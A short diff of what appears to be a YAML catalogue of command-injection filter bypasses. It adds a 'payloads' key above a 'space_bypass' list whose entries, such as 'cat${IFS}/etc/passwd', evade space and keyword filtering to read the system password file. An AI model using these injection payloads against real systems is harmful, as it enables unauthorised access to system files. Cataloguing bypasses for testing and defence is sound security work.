@@ -21,6 +21,7 @@ trigger_signals:
   - "命令关键字（whoami/id/cat）被过滤"
 
 bypass_techniques:
+payloads:
   space_bypass:
     - "cat${IFS}/etc/passwd"
     - "cat$IFS$9/etc/passwd"
